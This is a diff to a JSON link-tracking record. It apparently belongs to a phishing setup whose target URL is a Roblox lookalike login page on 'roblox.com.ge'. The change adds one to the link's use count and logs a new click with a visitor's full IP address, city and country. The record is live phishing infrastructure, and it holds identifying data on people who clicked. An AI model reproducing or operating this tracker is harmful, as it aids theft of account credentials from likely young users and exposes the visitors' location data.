@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1475,
+    "useCount": 1476,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11968,6 +11968,14 @@
         "city": "Auckland",
         "flag": "🇳🇿",
         "countryCode": "NZ"
+      },
+      {
+        "timestamp": 1777438616929,
+        "ip": "103.187.245.181",
+        "country": "Philippines",
+        "city": "Cagayan de Oro",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
